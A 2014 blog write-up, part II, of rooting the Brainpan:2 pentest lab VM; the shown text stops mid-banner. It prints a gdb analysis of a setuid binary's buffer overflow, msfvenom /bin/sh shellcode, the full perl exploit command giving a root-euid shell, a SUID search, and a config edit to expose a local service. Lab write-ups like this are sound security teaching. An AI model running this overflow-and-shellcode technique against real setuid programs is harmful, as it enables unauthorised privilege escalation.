---
layout: post
title: 'PENTEST LAB - BRAINPAN: 2 (part II: looking for root)'
date: '2014-06-11T15:38:00.000+02:00'
author: marcing
tags:
- hacking challenge
- penetration testing
- brainpan 2
- pentest lab
- pentests
modified_time: '2014-06-11T15:38:40.639+02:00'
blogger_id: tag:blogger.com,1999:blog-252370192815002266.post-528083528309828145
blogger_orig_url: https://blog.pentests.pl/2014/06/pentest-lab-brainpan-2-part-ii-rooting.html
excerpt: This is part II of the "Pentest Lab" in which I'm presenting my fight with "Brainpan:2".
---

This is part II of the "Pentest Lab" in which I'm presenting my fight with "Brainpan:2".
In <a href="http://blog.pentests.pl/2014/06/pentest-lab-brainpan-2-part-i-access.html" target="top">
the first part</a>
I've gained access to the machine. Now it's time to gain root. I've logged as user "anansi"
using reverse shell spawned from custom app running on port 9999. Let's have a&nbsp;look inside home folder
<div class="spacer"></div>  
### <center>!!!SPOILER ALERT!!!</center>
<div class="spacer"></div>  
If you want to finish this challenge alone stop reading here.

<div class="cssterm">
anansi@brainpan2:/opt$ cd /home
  cd /home
anansi@brainpan2:/home$ ls -la
  ls -la
  total 20
  drwxr-xr-x&nbsp; 5 root&nbsp;&nbsp;&nbsp; root&nbsp;&nbsp;&nbsp; 4096 Nov&nbsp; 4&nbsp; 2013 .
  drwxr-xr-x 22 root&nbsp;&nbsp;&nbsp; root&nbsp;&nbsp;&nbsp; 4096 Nov&nbsp; 5&nbsp; 2013 ..
  drwx------&nbsp; 2 anansi&nbsp; anansi&nbsp; 4096 Jun&nbsp; 6 07:03 anansi
  drwx------&nbsp; 4 puck&nbsp;&nbsp;&nbsp; puck&nbsp;&nbsp;&nbsp; 4096 Nov&nbsp; 5&nbsp; 2013 puck
  drwxr-xr-x&nbsp; 3 reynard reynard 4096 Nov&nbsp; 7&nbsp; 2013 reynard
anansi@brainpan2:/home$ cd anansi
  cd anansi
anansi@brainpan2:~$ ls -la
  ls -la
  total 28
  drwx------ 2 anansi anansi 4096 Jun&nbsp; 6 07:03 .
  drwxr-xr-x 5 root&nbsp;&nbsp; root&nbsp;&nbsp; 4096 Nov&nbsp; 4&nbsp; 2013 ..
  -rw------- 1 anansi anansi&nbsp;&nbsp;&nbsp; 0 Nov&nbsp; 5&nbsp; 2013 .bash_history
  -rw-r--r-- 1 anansi anansi&nbsp; 220 Nov&nbsp; 4&nbsp; 2013 .bash_logout
  -rw-r--r-- 1 anansi anansi 3392 Nov&nbsp; 4&nbsp; 2013 .bashrc
  -rw-r--r-- 1 anansi anansi&nbsp; 675 Nov&nbsp; 4&nbsp; 2013 .profile
  -rw-r--r-- 1 anansi anansi&nbsp;&nbsp; 22 Jun&nbsp; 6 07:03 somefilename
  -rwxr-xr-x 1 anansi anansi&nbsp; 114 Nov&nbsp; 4&nbsp; 2013 startbrainpan.sh
anansi@brainpan2:~$ cd ..
  cd ..
anansi@brainpan2:/home$ ls
  ls
  anansi&nbsp; puck&nbsp; reynard
anansi@brainpan2:/home$ cd reynard
  cd reynard
anansi@brainpan2:/home/reynard$ ls -la
  ls -la
  total 44
  drwxr-xr-x 3 reynard reynard 4096 Nov&nbsp; 7&nbsp; 2013 .
  drwxr-xr-x 5 root&nbsp;&nbsp;&nbsp; root&nbsp;&nbsp;&nbsp; 4096 Nov&nbsp; 4&nbsp; 2013 ..
  -rw------- 1 reynard reynard&nbsp;&nbsp;&nbsp; 0 Nov&nbsp; 7&nbsp; 2013 .bash_history
  -rw-r--r-- 1 reynard reynard&nbsp; 220 Nov&nbsp; 4&nbsp; 2013 .bash_logout
  -rw-r--r-- 1 reynard reynard 3392 Nov&nbsp; 4&nbsp; 2013 .bashrc
  -rwsr-xr-x 1 root&nbsp;&nbsp;&nbsp; root&nbsp;&nbsp;&nbsp; 8999 Nov&nbsp; 6&nbsp; 2013 msg_root
  -rw-r--r-- 1 reynard reynard&nbsp; 675 Nov&nbsp; 4&nbsp; 2013 .profile
  -rw-r--r-- 1 reynard reynard&nbsp; 154 Nov&nbsp; 5&nbsp; 2013 readme.txt
  -rwxr-xr-x 1 reynard reynard&nbsp; 137 Nov&nbsp; 4&nbsp; 2013 startweb.sh
  drwxr-xr-x 3 reynard reynard 4096 Nov&nbsp; 4&nbsp; 2013 web
anansi@brainpan2:/home/reynard$ ./msg_root
  ./msg_root
  usage: msg_root username message
</div>


Nothing interesting in anansi folder, but I&nbsp;could access reynard home folder and
found there an interesting app. I've started SimpleHTTPServer inside his folder and
downloaded a&nbsp;binary.

<div class="cssterm">
anansi@brainpan2:/home/reynard$ python -m SimpleHTTPServer 12000
  python -m SimpleHTTPServer 12000
  Serving HTTP on 0.0.0.0 port 12000 ...
  192.168.57.1 - - [06/Jun/2014 07:33:09] "GET / HTTP/1.1" 200 -
  192.168.57.1 - - [06/Jun/2014 07:33:09] code 404, message File not found
  192.168.57.1 - - [06/Jun/2014 07:33:09] "GET /favicon.ico HTTP/1.1" 404 -
  192.168.57.1 - - [06/Jun/2014 07:33:09] code 404, message File not found
  192.168.57.1 - - [06/Jun/2014 07:33:09] "GET /favicon.ico HTTP/1.1" 404 -
  192.168.57.1 - - [06/Jun/2014 07:33:11] "GET /msg_root HTTP/1.1" 200 -
</div>

At this point I&nbsp;knew that there's probably a&nbsp;some way to exploit that binary.
Why? That's why:

<div class="cssterm">
anansi@brainpan2:/home/reynard$ ./msg_root aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
  &lt;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
  Segmentation fault
anansi@brainpan2:/home/reynard$
</div>

Let's make some reverse engineering.
<div class="cssterm">
$ gdb msg_root
  GNU gdb (GDB) 7.4.1-debian
  Copyright (C) 2012 Free Software Foundation, Inc.
  License GPLv3+: GNU GPL version 3 or later &lt;http://gnu.org/licenses/gpl.html&gt;
  This is free software: you are free to change and redistribute it.
  There is NO WARRANTY, to the extent permitted by law.&nbsp; Type "show copying"
  and "show warranty" for details.
  This GDB was configured as "x86_64-linux-gnu".
  For bug reporting instructions, please see:
  &lt;http://www.gnu.org/software/gdb/bugs/&gt;...
  Reading symbols from /home/..../msg_root...done.
(gdb) r&nbsp;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
  Starting program: /home/..../brainpan2/msg_root aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa

  Program received signal SIGSEGV, Segmentation fault.
  0x61616161 in ?? ()
(gdb) bt
  #0&nbsp; 0x61616161 in ?? ()
  #1&nbsp; 0x0804872e in get_name (u=0xffffd5c3 'a' &lt;repeats 108 times&gt;, m=0xffffd630 'a' &lt;repeats 87 times&gt;) at msg_root.c:26
  #2&nbsp; 0x0804877b in main (argc=3, argv=0xffffd434) at msg_root.c:35
</div>

I've checked file in hte and found some functions inside:
- save_msg
- get_name
- main

When app is executed it goes: main -&gt; get_name -&gt; save_msg. Looking on backtrace
from crash I&nbsp;noticed address 0x0804872e which is inside method get_name.
Disassembling this function gives code like below:

<div class="cssterm">
Dump of assembler code for function get_name:
  &nbsp;&nbsp; 0x080486a1 &lt;+0&gt;:&nbsp;&nbsp; &nbsp;push&nbsp;&nbsp; %ebp
  &nbsp;&nbsp; 0x080486a2 &lt;+1&gt;:&nbsp;&nbsp; &nbsp;mov&nbsp;&nbsp;&nbsp; %esp,%ebp
  &nbsp;&nbsp; 0x080486a4 &lt;+3&gt;:&nbsp;&nbsp; &nbsp;sub&nbsp;&nbsp;&nbsp; $0x20,%esp
  &nbsp;&nbsp; 0x080486a7 &lt;+6&gt;:&nbsp;&nbsp; &nbsp;movl&nbsp;&nbsp; $0x804863c,-0x4(%ebp)
  &nbsp;&nbsp; 0x080486ae &lt;+13&gt;:&nbsp;&nbsp; &nbsp;mov&nbsp;&nbsp;&nbsp; 0x8(%ebp),%eax
  &nbsp;&nbsp; 0x080486b1 &lt;+16&gt;:&nbsp;&nbsp; &nbsp;mov&nbsp;&nbsp;&nbsp; %eax,(%esp)
  &nbsp;&nbsp; 0x080486b4 &lt;+19&gt;:&nbsp;&nbsp; &nbsp;call&nbsp;&nbsp; 0x8048500 &lt;strlen@plt&gt;
  &nbsp;&nbsp; 0x080486b9 &lt;+24&gt;:&nbsp;&nbsp; &nbsp;cmp&nbsp;&nbsp;&nbsp; $0x11,%eax
  &nbsp;&nbsp; 0x080486bc &lt;+27&gt;:&nbsp;&nbsp; &nbsp;ja&nbsp;&nbsp;&nbsp;&nbsp; 0x80486d2 &lt;get_name+49&gt;
  &nbsp;&nbsp; 0x080486be &lt;+29&gt;:&nbsp;&nbsp; &nbsp;mov&nbsp;&nbsp;&nbsp; 0x8(%ebp),%eax
  &nbsp;&nbsp; 0x080486c1 &lt;+32&gt;:&nbsp;&nbsp; &nbsp;mov&nbsp;&nbsp;&nbsp; %eax,0x4(%esp)
  &nbsp;&nbsp; 0x080486c5 &lt;+36&gt;:&nbsp;&nbsp; &nbsp;lea&nbsp;&nbsp;&nbsp; -0x12(%ebp),%eax
  &nbsp;&nbsp; 0x080486c8 &lt;+39&gt;:&nbsp;&nbsp; &nbsp;mov&nbsp;&nbsp;&nbsp; %eax,(%esp)
  &nbsp;&nbsp; 0x080486cb &lt;+42&gt;:&nbsp;&nbsp; &nbsp;call&nbsp;&nbsp; 0x80484b0 &lt;strcpy@plt&gt;
  &nbsp;&nbsp; 0x080486d0 &lt;+47&gt;:&nbsp;&nbsp; &nbsp;jmp&nbsp;&nbsp;&nbsp; 0x80486ec &lt;get_name+75&gt;
  &nbsp;&nbsp; 0x080486d2 &lt;+49&gt;:&nbsp;&nbsp; &nbsp;movl&nbsp;&nbsp; $0x12,0x8(%esp)
  &nbsp;&nbsp; 0x080486da &lt;+57&gt;:&nbsp;&nbsp; &nbsp;mov&nbsp;&nbsp;&nbsp; 0x8(%ebp),%eax
  &nbsp;&nbsp; 0x080486dd &lt;+60&gt;:&nbsp;&nbsp; &nbsp;mov&nbsp;&nbsp;&nbsp; %eax,0x4(%esp)
  &nbsp;&nbsp; 0x080486e1 &lt;+64&gt;:&nbsp;&nbsp; &nbsp;lea&nbsp;&nbsp;&nbsp; -0x12(%ebp),%eax
  &nbsp;&nbsp; 0x080486e4 &lt;+67&gt;:&nbsp;&nbsp; &nbsp;mov&nbsp;&nbsp;&nbsp; %eax,(%esp)
  &nbsp;&nbsp; 0x080486e7 &lt;+70&gt;:&nbsp;&nbsp; &nbsp;call&nbsp;&nbsp; 0x8048540 &lt;strncpy@plt&gt;
  &nbsp;&nbsp; 0x080486ec &lt;+75&gt;:&nbsp;&nbsp; &nbsp;movl&nbsp;&nbsp; $0x7d0,(%esp)
  &nbsp;&nbsp; 0x080486f3 &lt;+82&gt;:&nbsp;&nbsp; &nbsp;call&nbsp;&nbsp; 0x80484c0 &lt;malloc@plt&gt;
  &nbsp;&nbsp; 0x080486f8 &lt;+87&gt;:&nbsp;&nbsp; &nbsp;mov&nbsp;&nbsp;&nbsp; %eax,-0x8(%ebp)
  &nbsp;&nbsp; 0x080486fb &lt;+90&gt;:&nbsp;&nbsp; &nbsp;mov&nbsp;&nbsp;&nbsp; 0xc(%ebp),%eax
  &nbsp;&nbsp; 0x080486fe &lt;+93&gt;:&nbsp;&nbsp; &nbsp;mov&nbsp;&nbsp;&nbsp; %eax,(%esp)
  &nbsp;&nbsp; 0x08048701 &lt;+96&gt;:&nbsp;&nbsp; &nbsp;call&nbsp;&nbsp; 0x8048500 &lt;strlen@plt&gt;
  &nbsp;&nbsp; 0x08048706 &lt;+101&gt;:&nbsp;&nbsp; &nbsp;mov&nbsp;&nbsp;&nbsp; %eax,0x8(%esp)
  &nbsp;&nbsp; 0x0804870a &lt;+105&gt;:&nbsp;&nbsp; &nbsp;mov&nbsp;&nbsp;&nbsp; 0xc(%ebp),%eax
  &nbsp;&nbsp; 0x0804870d &lt;+108&gt;:&nbsp;&nbsp; &nbsp;mov&nbsp;&nbsp;&nbsp; %eax,0x4(%esp)
  &nbsp;&nbsp; 0x08048711 &lt;+112&gt;:&nbsp;&nbsp; &nbsp;mov&nbsp;&nbsp;&nbsp; -0x8(%ebp),%eax
  &nbsp;&nbsp; 0x08048714 &lt;+115&gt;:&nbsp;&nbsp; &nbsp;mov&nbsp;&nbsp;&nbsp; %eax,(%esp)
  &nbsp;&nbsp; 0x08048717 &lt;+118&gt;:&nbsp;&nbsp; &nbsp;call&nbsp;&nbsp; 0x8048540 &lt;strncpy@plt&gt;
  &nbsp;&nbsp; 0x0804871c &lt;+123&gt;:&nbsp;&nbsp; &nbsp;mov&nbsp;&nbsp;&nbsp; -0x8(%ebp),%eax
  &nbsp;&nbsp; 0x0804871f &lt;+126&gt;:&nbsp;&nbsp; &nbsp;mov&nbsp;&nbsp;&nbsp; %eax,0x4(%esp)
  &nbsp;&nbsp; 0x08048723 &lt;+130&gt;:&nbsp;&nbsp; &nbsp;lea&nbsp;&nbsp;&nbsp; -0x12(%ebp),%eax
  &nbsp;&nbsp; 0x08048726 &lt;+133&gt;:&nbsp;&nbsp; &nbsp;mov&nbsp;&nbsp;&nbsp; %eax,(%esp)
  =&gt; 0x08048729 &lt;+136&gt;:&nbsp;&nbsp; &nbsp;mov&nbsp;&nbsp;&nbsp; -0x4(%ebp),%eax
  &nbsp;&nbsp; 0x0804872c &lt;+139&gt;:&nbsp;&nbsp; &nbsp;call&nbsp;&nbsp; *%eax
  &nbsp;&nbsp; 0x0804872e &lt;+141&gt;:&nbsp;&nbsp; &nbsp;mov&nbsp;&nbsp;&nbsp; -0x8(%ebp),%eax
  &nbsp;&nbsp; 0x08048731 &lt;+144&gt;:&nbsp;&nbsp; &nbsp;mov&nbsp;&nbsp;&nbsp; %eax,(%esp)
  &nbsp;&nbsp; 0x08048734 &lt;+147&gt;:&nbsp;&nbsp; &nbsp;call&nbsp;&nbsp; 0x8048490 &lt;free@plt&gt;
  &nbsp;&nbsp; 0x08048739 &lt;+152&gt;:&nbsp;&nbsp; &nbsp;leave
  &nbsp;&nbsp; 0x0804873a &lt;+153&gt;:&nbsp;&nbsp; &nbsp;ret&nbsp;&nbsp;
End of assembler dump.
</div>

The arrow points instruction that moves content of the address 4bytes before ebp
and moves it to eax and then jumps to it. Here's how this looks when user provides
valid input:

<div class="cssterm">
  Breakpoint 2, 0x08048729 in get_name (u=0xffffd644 "aaaaaaa", m=0xffffd64c 'b' &lt;repeats 18 times&gt;) at msg_root.c:26
  26&nbsp;&nbsp;&nbsp; in msg_root.c
(gdb) i&nbsp;r ebp eax
  ebp&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 0xffffd3f8&nbsp;&nbsp; &nbsp;0xffffd3f8
  eax&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 0xffffd3e6&nbsp;&nbsp; &nbsp;-11290
(gdb) x&nbsp;$ebp-4
  0xffffd3f4:&nbsp;&nbsp; &nbsp;0x0804863c
(gdb) x/12xw $esp
0xffffd3d8:&nbsp;&nbsp;&nbsp; 0xffffd3e6&nbsp;&nbsp;&nbsp; 0x0804a008&nbsp;&nbsp;&nbsp; 0x00000012&nbsp;&nbsp;&nbsp; 0x6161d4b4
0xffffd3e8:&nbsp;&nbsp;&nbsp; 0x61616161&nbsp;&nbsp;&nbsp; 0xffff0061&nbsp;&nbsp;&nbsp; 0x0804a008&nbsp;&nbsp;&nbsp; 0x0804863c
0xffffd3f8:&nbsp;&nbsp;&nbsp; 0xffffd408&nbsp;&nbsp;&nbsp; 0x0804877b&nbsp;&nbsp;&nbsp; 0xffffd644&nbsp;&nbsp;&nbsp; 0xffffd64c
</div>

You can notice few 61 which corresponds to&nbsp; "aaaaaaa". Command  x&nbsp;$ebp-4
shows what will be moved to eax, address 0x0804863c is where save_msg method starts.
Checking address 0x0804a008 which is ebp-8 shows that this is a&nbsp;memory where
second argument is copied (in my case it's a&nbsp;few b's which are 0x62 below):

<div class="cssterm">
(gdb) x/8xw 0x0804a008
  0x804a008:&nbsp;&nbsp;&nbsp; 0x62626262&nbsp;&nbsp;&nbsp; 0x62626262&nbsp;&nbsp;&nbsp; 0x62626262&nbsp;&nbsp;&nbsp; 0x62626262
  0x804a018:&nbsp;&nbsp;&nbsp; 0x00006262&nbsp;&nbsp;&nbsp; 0x00000000&nbsp;&nbsp;&nbsp; 0x00000000&nbsp;&nbsp;&nbsp; 0x00000000
  Moving further:
(gdb) s

  Breakpoint 3, 0x0804872c in get_name (u=0xffffd644 "aaaaaaa", m=0xffffd64c 'b' &lt;repeats 18 times&gt;) at msg_root.c:26
  26&nbsp;&nbsp;&nbsp; in msg_root.c
(gdb) i&nbsp;r ebp eax
ebp&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 0xffffd3f8&nbsp;&nbsp;&nbsp; 0xffffd3f8
eax&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 0x804863c&nbsp;&nbsp;&nbsp; 134514236
</div>

you can see eax is now pointing to save_msg. Providing long first argument one can
overwrite memory which will be copied to eax and thus crash the app, as shown below:

<div class="cssterm">
  Breakpoint 2, 0x08048729 in get_name (u=0xffffd60c 'a' &lt;repeats 63 times&gt;, m=0xffffd64c 'b' &lt;repeats 18 times&gt;) at msg_root.c:26
  26&nbsp;&nbsp;&nbsp; in msg_root.c
(gdb) x/16xw $esp
  0xffffd3a8:&nbsp;&nbsp;&nbsp; 0xffffd3b6&nbsp;&nbsp;&nbsp; 0x0804a008&nbsp;&nbsp;&nbsp; 0x00000012&nbsp;&nbsp;&nbsp; 0x6161d484
  0xffffd3b8:&nbsp;&nbsp;&nbsp; 0x61616161&nbsp;&nbsp;&nbsp; 0x61616161&nbsp;&nbsp;&nbsp; 0x0804a008&nbsp;&nbsp;&nbsp; 0x61616161
  0xffffd3c8:&nbsp;&nbsp;&nbsp; 0xffffd3d8&nbsp;&nbsp;&nbsp; 0x0804877b&nbsp;&nbsp;&nbsp; 0xffffd60c&nbsp;&nbsp;&nbsp; 0xffffd64c
  0xffffd3d8:&nbsp;&nbsp;&nbsp; 0xffffd458&nbsp;&nbsp;&nbsp; 0xf7e6ee46&nbsp;&nbsp;&nbsp; 0x00000003&nbsp;&nbsp;&nbsp; 0xffffd484
(gdb) i&nbsp;r ebp eax
  ebp&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 0xffffd3c8&nbsp;&nbsp;&nbsp; 0xffffd3c8
  eax&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 0xffffd3b6&nbsp;&nbsp;&nbsp; -11338
(gdb) s

  Breakpoint 3, 0x0804872c in get_name (u=0xffffd60c 'a' &lt;repeats 63 times&gt;, m=0xffffd64c 'b' &lt;repeats 18 times&gt;) at msg_root.c:26
  26&nbsp;&nbsp;&nbsp; in msg_root.c
(gdb) i&nbsp;r ebp eax
  ebp&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 0xffffd3c8&nbsp;&nbsp;&nbsp; 0xffffd3c8
  eax&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 0x61616161&nbsp;&nbsp;&nbsp; 1633771873
(gdb) s

  Program received signal SIGSEGV, Segmentation fault.
  0x61616161 in ?? ()
</div>

Armed with that knowledge I&nbsp;started exploitation phase. My idea was simple.
Provide address to the shellcode in first argument while writing the shellcode in
the second one. So the first argument can only be the 0x0804a008 repeated few times
which gives me: `perl -e 'print "\x04\x08\x08\xa0"x8;'`

For the second argument I've needed shellcode. You can find one online or use msfvenom:

<div class="cssterm">
$ msfvenom -p linux/x86/exec CMD="/bin/sh" -b "x00" -f py
  No platform was selected, choosing Msf::Module::Platform::Linux from the payload
  No Arch selected, selecting Arch: x86 from the payload
  Found 22 compatible encoders
  Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
  x86/shikata_ga_nai succeeded with size 70 (iteration=0)
  buf =&nbsp; ""
  buf += "\xdb\xd2\xbe\xae\x71\x9c\x42\xd9\x74\x24\xf4\x5a\x31"
  buf += "\xc9\xb1\x0b\x83\xc2\x04\x31\x72\x16\x03\x72\x16\xe2"
  buf += "\x5b\x1b\x97\x1a\x3a\x8e\xc1\xf2\x11\x4c\x87\xe4\x01"
  buf += "\xbd\xe4\x82\xd1\xa9\x25\x31\xb8\x47\xb3\x56\x68\x70"
  buf += "\xcb\x98\x8c\x80\xe3\xfa\xe5\xee\xd4\x89\x9d\xee\x7d"
  buf += "\x3d\xd4\x0e\x4c\x41"
</div>

Here's the second argument:

`perl -e 'print "\xdb\xd2\xbe\xae\x71\x9c\x42\xd9\x74\x24\xf4\x5a\x31\xc9\xb1\x0b\x83\xc2\x04\x31\x72\x16\x03\x72\x16\xe2\x5b\x1b\x97\x1a\x3a\x8e\xc1\xf2\x11\x4c\x87\xe4\x01\xbd\xe4\x82\xd1\xa9\x25\x31\xb8\x47\xb3\x56\x68\x70\xcb\x98\x8c\x80\xe3\xfa\xe5\xee\xd4\x89\x9d\xee\x7d\x3d\xd4\x0e\x4c\x41";'`

And command in action:

<div class="cssterm">
anansi@brainpan2:/home/reynard$ ./msg_root `perl -e 'print "\x04\x08\x08\xa0"x8;'` `perl -e 'print "\xdb\xd2\xbe\xae\x71\x9c\x42\xd9\x74\x24\xf4\x5a\x31\xc9\xb1\x0b\x83\xc2\x04\x31\x72\x16\x03\x72\x16\xe2\x5b\x1b\x97\x1a\x3a\x8e\xc1\xf2\x11\x4c\x87\xe4\x01\xbd\xe4\x82\xd1\xa9\x25\x31\xb8\x47\xb3\x56\x68\x70\xcb\x98\x8c\x80\xe3\xfa\xe5\xee\xd4\x89\x9d\xee\x7d\x3d\xd4\x0e\x4c\x41";'`
&lt;x98\x8c\x80\xe3\xfa\xe5\xee\xd4\x89\x9d\xee\x7d\x3d\xd4\x0e\x4c\x41";'`&nbsp;&nbsp;&nbsp;&nbsp;
$ id
  id
  uid=1000(anansi) gid=1000(anansi) euid=104(root) groups=106(root),50(staff),1000(anansi)
$ cd /root
  cd /root
  $ ls -la
  ls -la
  total 28
  drwx------&nbsp; 3 root&nbsp; root&nbsp; 4096 Nov&nbsp; 5&nbsp; 2013 .
  drwxr-xr-x 22 root&nbsp; root&nbsp; 4096 Nov&nbsp; 5&nbsp; 2013 ..
  drwx------&nbsp; 2 root&nbsp; root&nbsp; 4096 Nov&nbsp; 4&nbsp; 2013 .aptitude
  -rw-------&nbsp; 1 root&nbsp; root&nbsp;&nbsp;&nbsp;&nbsp; 0 Nov&nbsp; 5&nbsp; 2013 .bash_history
  -rw-r--r--&nbsp; 1 root&nbsp; root&nbsp;&nbsp; 589 Nov&nbsp; 5&nbsp; 2013 .bashrc
  -rw-r--r--&nbsp; 1 root&nbsp; root&nbsp;&nbsp; 159 Nov&nbsp; 5&nbsp; 2013 .profile
  -rw-------&nbsp; 1 root&nbsp; root&nbsp;&nbsp; 461 Nov&nbsp; 5&nbsp; 2013 flag.txt
  -rw-------&nbsp; 1 root&nbsp; root&nbsp;&nbsp; 245 Nov&nbsp; 5&nbsp; 2013 whatif.txt
$ cat flag.txt
  cat flag.txt
  cat: flag.txt: Permission denied
$ cat whatif.txt
  cat whatif.txt

  &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; WHAT IF I&nbsp;TOLD YOU
  &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ___
  &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; /&nbsp;&nbsp;&nbsp;&nbsp; \
  &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; | ______\
  &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; (, \_/ \_/
  &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; |&nbsp;&nbsp; ._. |
  &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; \&nbsp;&nbsp; --- /
  &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; /`-.__.'
  &nbsp;&nbsp;&nbsp;&nbsp;&nbsp; .---'`-.___|\___
  &nbsp;&nbsp;&nbsp;&nbsp; /&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; `.

  &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; YOU ARE NOT ROOT?
$ ls -n
  ls -n
  total 8
  -rw------- 1&nbsp;&nbsp; 0&nbsp;&nbsp; 0 461 Nov&nbsp; 5&nbsp; 2013 flag.txt
  -rw------- 1 104 106 245 Nov&nbsp; 5&nbsp; 2013 whatif.txt
</div>

I must say, the trick with the root account is a&nbsp;nice one. There are two accounts
one named "root" and the other one "root " (with a&nbsp;space on the end). The second
one is the real root here. There's still a&nbsp;long road before me...
I looked for SUID/SGID execs:

<div class="cssterm">
$ find / -perm -g=s -o -perm -u=s -type f&nbsp;2&gt;/dev/null
  find / -perm -g=s -o -perm -u=s -type f&nbsp;2&gt;/dev/null
  ...
  /opt/old/brainpan-1.8/brainpan-1.8.exe
  ...
  This one in opt folder caught my attention. I&nbsp;found some files in that folder:

$ ls -la
  ls -la
  total 36
  drwxrwxr-x 2 root&nbsp; staff&nbsp; 4096 Nov&nbsp; 5&nbsp; 2013 .
  drwx------ 3 root&nbsp; root&nbsp;&nbsp; 4096 Nov&nbsp; 4&nbsp; 2013 ..
  -rwsr-xr-x 1 puck&nbsp; puck&nbsp; 17734 Nov&nbsp; 4&nbsp; 2013 brainpan-1.8.exe
  -rw-r--r-- 1 puck&nbsp; puck&nbsp;&nbsp; 1227 Nov&nbsp; 5&nbsp; 2013 brainpan.7
  -rw-rw-rw- 1 puck&nbsp; staff&nbsp;&nbsp;&nbsp; 27 Nov&nbsp; 5&nbsp; 2013 brainpan.cfg
$ cat brainpan.cfg
  cat brainpan.cfg
  port=9333
  ipaddr=127.0.0.1
  Let's modify the cfg to run app on all addresses:
$ echo "port=9333" &gt; brainpan.cfg
  echo "port=9333" &gt; brainpan.cfg
$ echo "ipaddr=0.0.0.0" &gt;&gt; brainpan.cfg
  echo "ipaddr=0.0.0.0" &gt;&gt; brainpan.cfg
$ cat brainpan.cfg
  cat brainpan.cfg
  port=9333
  ipaddr=0.0.0.0
</div>

I've started the app and connected from my machine:

<div class="cssterm">
$ nc 192.168.57.10 9444
  _|&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; _|&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
  _|_|_|&nbsp;&nbsp;&nbsp; _|&nbsp; _|_|&nbsp;&nbsp;&nbsp; _|_|_|&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; _|_|_|&nbsp;&nbsp;&nbsp; _|_|_|&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; _|_|_|&nbsp; _|_|_|&nbsp;
